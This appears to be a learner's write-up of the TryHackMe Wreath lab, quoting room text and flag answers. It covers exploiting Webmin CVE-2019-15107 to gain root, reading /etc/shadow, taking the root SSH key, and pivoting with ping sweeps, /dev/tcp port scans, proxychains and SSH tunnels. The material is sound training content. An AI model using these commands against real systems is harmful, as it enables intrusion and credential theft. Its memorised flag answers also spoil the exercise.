# Enumeration
**As with any attack, we first begin with the enumeration phase. Completing the [Nmap](https://tryhackme.com/room/furthernmap) room (if you haven't already) will help with this section.**

**Thomas gave us an IP to work with (shown on the Network Panel at the top of the page). Let's start by performing a port scan on the first 15000 ports of this IP.**

_**Note:** Here (and in general), it's a good idea to save your scan results to a file so you don't have to re-run the same scan twice._

How many of the first 15000 ports are open on the target?

![[Screenshot from 2024-10-27 19-43-42.png]]

**flag: `4`**

Perform a service scan on these open ports.  

What OS does Nmap think is running?

![[Screenshot from 2024-10-27 19-50-10.png]]

**flag: `CentOS`**

Okay, we know what we're dealing with.

Open the IP in your browser -- what site does the server try to redirect you to?

**flag: `https://thomaswreath.thm`**

You will have noticed that the site failed to resolve. Looks like Thomas forgot to set up the DNS!

Add it to your hosts file manually. This can be accomplished by editing the `/etc/hosts` file on Linux/MacOS, or `C:\Windows\System32\drivers\etc\hosts` on Windows, to include the IP address, followed by a tab, then the domain name. **Note:** this _must_ be done as root/Administrator.

It should look something like this when done, although the _IP address and domain name will be different_:

`10.10.10.10 example.thm`

Reload the webpage -- it should now resolve, but it will give you a different error related to the TLS certificate. This occurs because the box is not really connected to the internet and so cannot have a signed TLS certificate. In this instance it is safe to click "Advanced" -> "Accept Risk"; however, you should never do this in the real world.  

In real life we would perform a "footprinting" phase of the engagement at this point. This essentially involves finding as much public information about the target as possible and noting it down. You never know what could prove useful!  

Read through the text on the page. What is Thomas' mobile phone number?

**flag: `+447821548812`**

Let's have a look at the highest open port.  

Look back at your service scan results: what server version does Nmap detect as running here?

![[Screenshot from 2024-10-27 20-13-19.png]]

**flag: ``**

Put your answer to the last question into Google.

It appears that this service is vulnerable to an unauthenticated remote code execution exploit!

What is the CVE number for this exploit?

**flag: `CVE-2019-15107`**

We have everything we need to break into this machine, so let's get going!

---
# Exploitation
In the previous task we found a vulnerable service[[1]](https://sensorstechforum.com/cve-2019-15107-webmin/)[[2]](https://www.webmin.com/exploit.html) running on the target which will give us the ability to execute commands on the target.

The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for these in an upcoming task!), however, in this instance, an exploit is provided [here](https://github.com/MuirlandOracle/CVE-2019-15107).

---

Start by cloning the repository. This can be done with the following command:

`git clone https://github.com/MuirlandOracle/CVE-2019-15107`  

This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:

`cd CVE-2019-15107 && pip3 install -r requirements.txt`  

If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:  
`sudo apt install python3-pip`  

The script should already be executable, but if not, add the executable bit (`chmod +x ./CVE-2019-15107.py`).

Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to read through scripts before running them).  

Once you're satisfied that the script will do what it says it will, run the exploit against the target!

`./CVE-2019-15107.py TARGET_IP`

![Demonstration of the exploit](https://assets.tryhackme.com/additional/wreath-network/a876ed2dd7ce.png)

---

[1] [https://sensorstechforum.com/cve-2019-15107-webmin/](https://sensorstechforum.com/cve-2019-15107-webmin/)  
[2] [https://www.webmin.com/exploit.html](https://www.webmin.com/exploit.html)

Run the exploit and obtain a pseudoshell on the target!

Which user was the server running as?

**flag: `root`**

Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.

Before we do though: nice though this pseudoshell is, it's not a full reverse shell.

Get a reverse shell from the target. You can either do this manually, or by typing `shell` into the pseudoshell and following the instructions given.

**Optional:** Stabilise the reverse shell. There are several techniques for doing this detailed [here](https://tryhackme.com/room/introtoshells).

Now for a little post-exploitation!

What is the root user's password hash?

```bash
cat /etc/shadow
```

**flag: `$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1`**

You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.

What is the full path to this file?

**flag: `/root/.ssh/id_rsa`**

Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command `chmod 600 KEY_NAME` (substituting in the name of the key) to obtain persistent access to the box.  

We have everything we need for now. Let's move on to the next section: Pivoting!

---
# What is Pivoting?
Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing, and is one of the three main teaching points for this room.

Put simply, by using one of the techniques described in the following tasks (or others!), it becomes possible for an attacker to gain initial access to a remote network, and use it to access other machines in the network that would not otherwise be accessible:

![Diagram showing an attacker machine outwith a target network with one public facing webserver and three terminals in an internal network.](https://assets.tryhackme.com/additional/wreath-network/6904b85a9b93.png)  

In this diagram, there are four machines on the target network: one public facing server, with three machines which are not exposed to the internet. By accessing the public server, we can then pivot to attack the remaining three targets.

_**Note:** This is an example diagram and is not representative of the Wreath Network._

This section will contain a lot of theory for pivoting from both Linux and Windows compromised targets, which we will then put into practice against the next machine in the network. Remember though: you have a sandbox environment available to you with the compromised machine in the Wreath network. After the enumeration tasks coming up, you'll also know about the next machine in the network. Feel free to use these boxes to play around with the tools as you go through the tasks, but be aware that some techniques may be stopped by the firewalls involved (which we will look at mitigating later in the network).

---
# High-level Overview

The methods we use to pivot tend to vary between the different target operating systems. Frameworks like Metasploit can make the process easier, however, for the time being, we'll be looking at more manual techniques for pivoting.

There are two main methods encompassed in this area of pentesting:

- **Tunnelling/Proxying:** Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be _tunnelled_ inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem (IDS) or firewall  
- **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host

A proxy is good if we want to redirect lots of different kinds of traffic into our target network - for example, with an nmap scan, or to access multiple ports on multiple different machines.

Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed. It would be sensible at this point to also start to draw up a layout of the network as you see it -- although in the case of this practice network, the layout is given in the box at the top of the screen.

As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.  

The remaining tasks in this section will cover the following topics:

- Enumerating a network using native and statically compiled tools
- Proxychains / FoxyProxy
- SSH port forwarding and tunnelling (primarily Unix)
- plink.exe (Windows)
- socat (Windows and Unix)  
- chisel (Windows and Unix)
- sshuttle (currently Unix only)

This is far from an exhaustive list of the tools available for pivoting, so further research is encouraged.

Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?

**flag: `Tunnelling`**

**Research:** Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?

**flag: `portfwd`**

---
# Enumeration
As always, enumeration is the key to success. Information is power -- the more we know about our target, the more options we have available to us. As such, our first step when attempting to pivot through a network is to get an idea of what's around us.

There are five possible ways to enumerate a network through a compromised host:

1. Using material found on the machine. The hosts file or ARP cache, for example  
2. Using pre-installed tools  
3. Using statically compiled tools
4. Using scripting techniques
5. Using local tools through a proxy

These are written in the order of preference. Using local tools through a proxy is incredibly slow, so should only be used as a last resort. Ideally we want to take advantage of pre-installed tools on the system (Linux systems sometimes have Nmap installed by default, for example). This is an example of Living off the Land (LotL) -- a good way to minimise risk. Failing that, it's very easy to transfer a static binary, or put together a simple ping-sweep tool in Bash (which we'll cover below).

![Tux the penguin with a toolkit](https://assets.tryhackme.com/additional/wreath-network/NWRkOTMzODNi.jpg)
Before anything else though, it's sensible to check to see if there are any pieces of useful information stored on the target. `arp -a` can be used to Windows or Linux to check the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in `/etc/hosts` on Linux, or `C:\Windows\System32\drivers\etc\hosts` on Windows.  `/etc/resolv.conf` on Linux may also identify any local DNS servers, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an interface is with `ipconfig /all`. Linux has an equivalent command as an alternative to reading the resolv.conf file: `nmcli dev show`.  

If there are no useful tools already installed on the system, and the rudimentary scripts are not working, then it's possible to get _static_ copies of many tools. These are versions of the tool that have been compiled in such a way as to not require any dependencies from the box. In other words, they could theoretically work on _any_ target, assuming the correct OS and architecture. For example: statically compiled copies of Nmap for different operating systems (along with various other tools) can be found in various places on the internet. A good (if dated) resource for these can be found [here](https://github.com/andrew-d/static-binaries). A more up-to-date (at the time of writing) version of Nmap for Linux specifically can be found [here](https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip). Be aware that many repositories of static tools are very outdated. Tools from these repositories will likely still do the job; however, you may find that they require different syntax, or don't work in quite the way that you've come to expect.

_**Note:** The difference between a "static" binary and a "dynamic" binary is in the compilation. Most programs use a variety of external libraries (_`.so` _files on Linux, or_ `.dll` _files on Windows) -- these are referred to as "dynamic" programs. Static programs are compiled with these libraries built into the finished executable file. When we're trying to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed meaning that a dynamic binary would be unable to run._

Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is _very_ slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy _specifically against the found ports_.

---

Before putting this all into practice let's talk about living off the land shell techniques. Ideally a tool like Nmap will already be installed on the target; however, this is not always the case (indeed, you'll find that Nmap is **not** installed on the currently compromised server of the Wreath network). If this happens, it's worth looking into whether you can use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x network:

`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`  

This could be easily modified to search other network ranges -- including the Wreath network.

The above command generates a full list of numbers from 1 to 255 and loops through it. For each number, it sends one ICMP ping packet to ![Radar filler image](https://assets.tryhackme.com/additional/wreath-network/NzA0MWYzMzQ1.jpg)192.168.1.x as a backgrounded job (meaning that each ping runs in parallel for speed), where i is the current number. Each response is searched for "bytes from" to see if the ping was successful. Only successful responses are shown.

The equivalent of this command in Powershell is unbearably slow, so it's better to find an alternative option where possible. It's relatively straight forward to write a simple network scanner in a language like C# (or a statically compiled scanner written in C/C++/Rust/etc), which can be compiled and used on the target. This, however, is outwith the scope of the Wreath network (although very simple beta examples can be found [here](https://github.com/MuirlandOracle/C-Sharp-Port-Scan) for C#, or [here](https://github.com/MuirlandOracle/CPP-Port-Scanner) for C++).

It's worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows boxes frequently do this, for example). This is likely to be less of a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network should be safe. It's worth keeping in mind, however.

If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.

Port scanning in bash can be done (ideally) entirely natively:

`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`  

Bear in mind that this will take a _very_ long time, however!

There are many other ways to perform enumeration using only the tools available on a system, so please experiment further and see what you can come up with!

What is the absolute path to the file containing DNS entries on Linux?

**flag: `/etc/resolv.conf`**

What is the absolute path to the hosts file on Windows?

**flag: `C:\Windows\System32\drivers\etc\hosts`**

How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?

**flag: `for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done`**

# Proxychains & Foxyproxy

In this task we'll be looking at two "proxy" tools: Proxychains and FoxyProxy. These both allow us to connect through one of the proxies we'll learn about in the upcoming tasks. When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.

Think of this as being something like a tunnel created between a port on our attacking box that comes out inside the target network -- like a secret tunnel from a fantasy story, hidden beneath the floorboards of the local bar and exiting in the palace treasure chamber.  

Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.

---
**Proxychains**  

Proxychains is a tool we have already briefly mentioned in previous tasks. It's a very useful tool -- although not without its drawbacks. Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.

That said, let's take a look at the tool itself.

Proxychains is a command line tool which is activated by prepending the command `proxychains` to other commands. For example, to proxy netcat  through a proxy, you could use the command:  
`proxychains nc 172.16.0.10 23`  

Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at `/etc/proxychains.conf`. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:

1. The current directory (i.e. `./proxychains.conf`)
2. `~/.proxychains/proxychains.conf`
3. `/etc/proxychains.conf`

This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: `cp /etc/proxychains.conf .`, then make any changes to the config file in a copy stored in your current directory. If you're likely to move directories a lot then you could instead place it in a `.proxychains` directory under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded from [here](https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf).  

Speaking of the `proxychains.conf` file, there is only one section of particular use to us at this moment of time: right at the bottom of the file are the servers used by the proxy. You can set more than one server here to chain proxies together, however, for the time being we will stick to one proxy:

![Screenshot of the default proxychains configuration showing the Proxylist section](https://assets.tryhackme.com/additional/wreath-network/443c865e3ff3.png)

Specifically, we are interested in the "ProxyList" section:  
```
[ProxyList]   
# add proxy here ...   
# meanwhile   
# defaults set to "tor"   
socks4  127.0.0.1 9050
```

It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor entrypoint, should you choose to run one on your attacking machine. That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being used for the proxies we'll be setting up in the following tasks.  

There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:  
![Screenshot showing the proxy_dns line in the Proxychains config](https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png)  

If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the `proxy_dns` line using a hashtag (`#`) at the start of the line before performing a scan through the proxy!  
![Proxy_DNS line commented out with a hashtag](https://assets.tryhackme.com/additional/wreath-network/557437aec525.png)  

Other things to note when scanning through proxychains:

- You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  `-Pn`  switch to prevent Nmap from trying it.
- It will be _extremely_ slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library). 

---
**FoxyProxy**

Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!

People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we'll be looking at in subsequent tasks in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for [Firefox](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/) and [Chrome](https://chrome.google.com/webstore/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb). There are two versions of FoxyProxy available: Basic and Standard. Basic works perfectly for our purposes, but feel free to experiment with standard if you wish.

After installing the extension in your browser of choice, click on it in your toolbar:  
![FoxyProxy Options button](https://assets.tryhackme.com/additional/wreath-network/c22f2ef3d6fc.png)

Click on the "Options" button. This will take you to a page where you can configure your saved proxies. Click "Add" on the left hand side of the screen:  
![Highlighting the add button on the left hand side of the options menu](https://assets.tryhackme.com/additional/wreath-network/92e3cabe22e8.png)

Fill in the IP and Port on the right hand side of the page that appears, then give it a name. Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a good bet, although Chisel (which we will cover in a later task) requires SOCKS5. An example config is given here:![Example config showing SOCKS4, 127.0.0.1 and 1337 as the respective options](https://assets.tryhackme.com/additional/wreath-network/19436164d15e.png) 
Press Save, then click on the icon in the task bar again to bring up the proxy menu. You can switch between any of your saved proxies by clicking on them:  
![Highlighting how to switch proxies](https://assets.tryhackme.com/additional/wreath-network/1d91c2b6a625.png)

Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.

With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!

What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?

**flag: `socks4 127.0.0.1 4242`**

What command would you use to telnet through a proxy to 172.16.0.100:23?

**flag: `proxychains telnet 172.16.0.100 23`**

You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?

**flag: `FP`**

# SSH Tunnelling / Port Forwarding
The first tool we'll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it's possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.

---

**Forward Connections**

Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

- Port forwarding is accomplished with the `-L` switch, which creates a link to a **L**ocal port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:  
    `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`  
    We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 _on our own_ _attacking machine._ For example, by entering `localhost:8000` into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use `sudo` to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.  
- Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:  
    `ssh -D 1337 user@172.16.0.5 -fN`  
    This again uses the `-fN` switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.  

---
**Reverse Connections**  

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine _from_ the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:

1. First, generate a new set of SSH keys and store them somewhere safe (`ssh-keygen`):  
    ![ssh-keygen process](https://assets.tryhackme.com/additional/wreath-network/62b2e09ba985.png)  
    This will create two new files: a private key, and a public key.  
2. Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first.
3. On a new line, type the following line, then paste in the public key:  
    `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`  
    This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

The final entry in the `authorized_keys` file should look something like this:

![The syntax shown above, in place within the file](https://assets.tryhackme.com/additional/wreath-network/055753470a05.png)  

Next. check if the SSH server on your attacking machine is running:  
`sudo systemctl status ssh`

If the service is running then you should get a response that looks like this (with "active" shown in the message):  
![systemctl output when checking SSH is active. You should see active (running) in the output](https://assets.tryhackme.com/additional/wreath-network/08746aa1021e.png)  

If the status command indicates that the server is not running then you can start the ssh service with:  
`sudo systemctl start ssh`

The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.

With the key transferred, we can then connect back with a reverse port forward using the following command:  
`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN   `

To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:  
`ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN   `

This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!

In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:  
`ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`  

This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

_**Note:** Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems._

To close any of these connections, type `ps aux | grep ssh` into the terminal of the machine that created the connection:

![Highlighting the process id of the ssh proxy/port forward](https://assets.tryhackme.com/additional/wreath-network/daf8fd5c8540.png)

Find the process ID (PID) of the connection. In the above image this is 105238.

Finally, type `sudo kill PID` to close the connection:
